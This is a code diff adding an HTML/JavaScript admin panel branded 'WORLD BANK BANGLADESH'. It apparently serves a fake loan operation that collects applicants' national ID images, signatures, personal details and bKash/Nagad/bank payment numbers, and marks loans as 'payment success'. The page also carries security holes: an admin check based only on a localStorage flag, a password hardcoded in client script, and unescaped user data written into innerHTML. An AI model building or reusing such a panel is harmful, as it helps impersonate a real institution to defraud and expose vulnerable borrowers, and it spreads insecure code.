@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>🌐 WORLD BANK BANGLADESH</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial;
+display:flex;
+background:#f1f5f9;
+}
+
+/* SIDEBAR */
+
+.sidebar{
+width:240px;
+height:100vh;
+background:#0047d4;
+padding:15px;
+box-sizing:border-box;
+color:white;
+position:fixed;
+left:0;
+top:0;
+overflow:auto;
+}
+
+.sideheader{
+text-align:center;
+margin-bottom:35px;
+}
+
+.sidelogo{
+width:80px;
+height:80px;
+border-radius:50%;
+background:white;
+object-fit:cover;
+margin-bottom:10px;
+}
+
+.sidename{
+font-size:22px;
+font-weight:bold;
+}
+
+.sidebtn{
+padding:15px;
+margin-bottom:14px;
+border-radius:16px;
+background:rgba(255,255,255,0.12);
+font-size:15px;
+font-weight:bold;
+cursor:pointer;
+transition:0.3s;
+}
+
+.sidebtn:hover{
+background:white;
+color:#0047d4;
+}
+
+.sidebtn.active{
+background:white;
+color:#0047d4;
+}
+
+/* CONTENT */
+
+.content{
+margin-left:240px;
+padding:20px;
+width:100%;
+}
+
+.card{
+background:white;
+padding:20px;
+border-radius:20px;
+box-shadow:0 0 15px rgba(0,0,0,0.08);
+margin-bottom:20px;
+display:none;
+}
+
+.title{
+font-size:24px;
+font-weight:bold;
+color:#0047d4;
+margin-bottom:18px;
+}
+
+input,
+select{
+width:100%;
+padding:14px;
+margin-bottom:15px;
+border:1px solid #cbd5e1;
+border-radius:14px;
+font-size:15px;
+box-sizing:border-box;
+}
+
+button{
+width:100%;
+padding:15px;
+border:none;
+border-radius:16px;
+background:#0047d4;
+color:white;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+margin-bottom:12px;
+}
+
+.userbox{
+background:#f8fafc;
+padding:16px;
+border-radius:14px;
+font-size:15px;
+line-height:30px;
+word-break:break-word;
+}
+
+.imagebox{
+margin-top:15px;
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:10px;
+}
+
+.imagebox img{
+width:100%;
+height:120px;
+object-fit:cover;
+border-radius:14px;
+border:2px solid #e2e8f0;
+background:white;
+}
+
+.statusbox{
+padding:12px;
+border-radius:12px;
+background:#eff6ff;
+margin-top:10px;
+font-weight:bold;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<!-- SIDEBAR -->
+
+<div class="sidebar">
+
+<div class="sideheader">
+
+<img
+src="logo.png"
+class="sidelogo">
+
+<div class="sidename">
+
+🌐 WORLD BANK BANGLADESH
+
+</div>
+
+<div
+style="
+margin-top:10px;
+font-size:14px;
+opacity:0.9;
+">
+
+Admin Panel
+
+</div>
+
+</div>
+
+<div class="sidebtn active">
+
+🔍 Search User
+
+</div>
+
+<div class="sidebtn">
+
+📋 Loan Details
+
+</div>
+
+<div class="sidebtn">
+
+⚙ Settings
+
+</div>
+
+<div
+class="sidebtn"
+onclick="logoutAdmin()">
+
+🚪 Logout
+
+</div>
+
+</div>
+
+<!-- CONTENT -->
+
+<div class="content">
+
+<!-- SEARCH -->
+
+<div class="card"
+style="display:block;">
+
+<div class="title">
+
+🔍 Search User
+
+</div>
+
+<input
+type="text"
+id="searchMobile"
+placeholder="Enter Mobile Number">
+
+<button onclick="searchUser()">
+
+Search User
+
+</button>
+
+<div
+class="userbox"
+id="userData">
+
+No User Found
+
+</div>
+
+<div class="imagebox">
+
+<img
+id="customerPhoto"
+loading="lazy"
+src="https://via.placeholder.com/300x120?text=Customer+Photo">
+
+<img
+id="nidFront"
+loading="lazy"
+src="https://via.placeholder.com/300x120?text=NID+Front">
+
+<img
+id="nidBack"
+loading="lazy"
+src="https://via.placeholder.com/300x120?text=NID+Back">
+
+<img
+id="signatureImage"
+loading="lazy"
+src="https://via.placeholder.com/300x120?text=Signature">
+
+</div>
+
+</div>
+
+<!-- LOAN DETAILS -->
+
+<div class="card">
+
+<div class="title">
+
+📋 Loan Details
+
+</div>
+
+<select id="loanStatus">
+
+<option value="pending">
+
+Pending
+
+</option>
+
+<option value="approved">
+
+Approved
+
+</option>
+
+<option value="rejected">
+
+Rejected
+
+</option>
+
+<option value="payment success">
+
+Payment Success
+
+</option>
+
+</select>
+
+<input
+type="number"
+id="approvedAmount"
+placeholder="Approved Amount">
+
+<button onclick="updateLoan()">
+
+Update Loan
+
+</button>
+
+<div
+class="statusbox"
+id="loanUpdateStatus">
+
+Waiting For Update...
+
+</div>
+
+</div>
+
+<!-- SETTINGS -->
+
+<div class="card">
+
+<div class="title">
+
+⚙ Settings
+
+</div>
+
+<input
+type="password"
+id="securePass"
+placeholder="Secure Settings Password">
+
+<button onclick="unlockSettings()">
+
+Unlock Settings
+
+</button>
+
+<div
+id="settingsArea"
+style="display:none;">
+
+<input
+type="text"
+placeholder="bKash Number">
+
+<input
+type="text"
+placeholder="Nagad Number">
+
+<input
+type="text"
+placeholder="Bank Name">
+
+<input
+type="text"
+placeholder="Bank Holder Name">
+
+<input
+type="text"
+placeholder="Bank Account Number">
+
+<button>
+
+Save Settings
+
+</button>
+
+</div>
+
+</div>
+
+</div>
+
+<script type="module">
+
+/* FIREBASE */
+
+import { initializeApp }
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+
+getFirestore,
+doc,
+getDoc,
+setDoc
+
+}
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+/* CONFIG */
+
+const firebaseConfig = {
+
+apiKey: "YOUR_API_KEY",
+
+authDomain: "loan-a87af.firebaseapp.com",
+
+projectId: "loan-a87af",
+
+storageBucket: "loan-a87af.firebasestorage.app",
+
+messagingSenderId: "661290569837",
+
+appId: "1:661290569837:web:0f03ecdfde2da0867def64"
+
+};
+
+const app =
+initializeApp(firebaseConfig);
+
+const db =
+getFirestore(app);
+
+/* ADMIN CHECK */
+
+if(localStorage.getItem("admin")!="true"){
+
+window.location.href =
+"admin-login.html";
+
+}
+
+/* SEARCH USER */
+
+window.searchUser =
+async function(){
+
+let mobile =
+
+document.getElementById("searchMobile").value;
+
+if(mobile==""){
+
+alert("Enter Mobile Number");
+
+return;
+
+}
+
+/* RESET IMAGE */
+
+document.getElementById("customerPhoto").src =
+"https://via.placeholder.com/300x120?text=Loading";
+
+document.getElementById("nidFront").src =
+"https://via.placeholder.com/300x120?text=Loading";
+
+document.getElementById("nidBack").src =
+"https://via.placeholder.com/300x120?text=Loading";
+
+document.getElementById("signatureImage").src =
+"https://via.placeholder.com/300x120?text=Loading";
+
+const ref =
+doc(db,"users",mobile);
+
+const snap =
+await getDoc(ref);
+
+if(snap.exists()){
+
+let data =
+snap.data();
+
+document.getElementById("userData")
+
+.innerHTML =
+
+`
+
+<b>👤 Name:</b>
+${data.name || ""}
+
+<br><br>
+
+<b>📱 Mobile:</b>
+${data.mobile || ""}
+
+<br><br>
+
+<b>🪪 NID:</b>
+${data.nid || ""}
+
+<br><br>
+
+<b>🎂 DOB:</b>
+${data.dob || ""}
+
+<br><br>
+
+<b>🏠 Current Address:</b>
+${data.currentAddress || ""}
+
+<br><br>
+
+<b>🏡 Permanent Address:</b>
+${data.permanentAddress || ""}
+
+<br><br>
+
+<b>⚧ Gender:</b>
+${data.sex || ""}
+
+<br><br>
+
+<b>👥 Nominee Name:</b>
+${data.nomineeName || ""}
+
+<br><br>
+
+<b>🔗 Nominee Relation:</b>
+${data.nomineeRelation || ""}
+
+<br><br>
+
+<b>📞 Nominee Mobile:</b>
+${data.nomineeMobile || ""}
+
+<br><br>
+
+<b>📋 Loan Purpose:</b>
+${data.purpose || ""}
+
+<br><br>
+
+<b>💰 Requested Loan:</b>
+৳${data.loanAmount || "0"}
+
+<br><br>
+
+<b>✅ Approved Amount:</b>
+৳${data.approvedAmount || "0"}
+
+<br><br>
+
+<b>📌 Status:</b>
+${data.status || "pending"}
+
+`;
+
+document.getElementById("approvedAmount").value =
+data.approvedAmount || "";
+
+document.getElementById("loanStatus").value =
+data.status || "pending";
+
+/* IMAGE LOAD */
+
+if(data.customerPhoto){
+
+document.getElementById("customerPhoto").src =
+data.customerPhoto;
+
+}
+
+if(data.nidFront){
+
+document.getElementById("nidFront").src =
+data.nidFront;
+
+}
+
+if(data.nidBack){
+
+document.getElementById("nidBack").src =
+data.nidBack;
+
+}
+
+if(data.signature){
+
+document.getElementById("signatureImage").src =
+data.signature;
+
+}
+
+}
+
+else{
+
+document.getElementById("userData")
+
+.innerHTML =
+
+"No User Found";
+
+}
+
+}
+
+/* UPDATE LOAN */
+
+window.updateLoan =
+async function(){
+
+let mobile =
+
+document.getElementById("searchMobile").value;
+
+let amount =
+
+document.getElementById("approvedAmount").value;
+
+let status =
+
+document.getElementById("loanStatus").value;
+
+if(mobile==""){
+
+alert("Search User First");
+
+return;
+
+}
+
+await setDoc(
+
+doc(db,"users",mobile),
+
+{
+
+approvedAmount:amount,
+
+status:status
+
+},
+
+{merge:true}
+
+);
+
+document.getElementById("loanUpdateStatus")
+
+.innerHTML =
+
+"Loan Successfully Updated";
+
+alert("Loan Updated");
+
+}
+
+/* SETTINGS */
+
+const settingsPassword =
+"Asdf25802580";
+
+window.unlockSettings =
+function(){
+
+let pass =
+
+document.getElementById("securePass").value;
+
+if(pass==settingsPassword){
+
+document.getElementById("settingsArea")
+
+.style.display = "block";
+
+}
+
+else{
+
+alert("Wrong Secure Password");
+
+}
+
+}
+
+/* LOGOUT */
+
+window.logoutAdmin =
+function(){
+
+localStorage.removeItem("admin");
+
+window.location.href =
+"admin-login.html";
+
+}
+
+/* SIDEBAR */
+
+const cards =
+document.querySelectorAll(".card");
+
+const buttons =
+document.querySelectorAll(".sidebtn");
+
+buttons.forEach((btn,index)=>{
+
+btn.onclick = function(){
+
+if(index==3) return;
+
+cards.forEach(card=>{
+
+card.style.display = "none";
+
+});
+
+buttons.forEach(b=>{
+
+b.classList.remove("active");
+
+});
+
+cards[index].style.display =
+"block";
+
+btn.classList.add("active");
+
+}
+
+});
+
+</script>
+
+</body>
+
+</html>
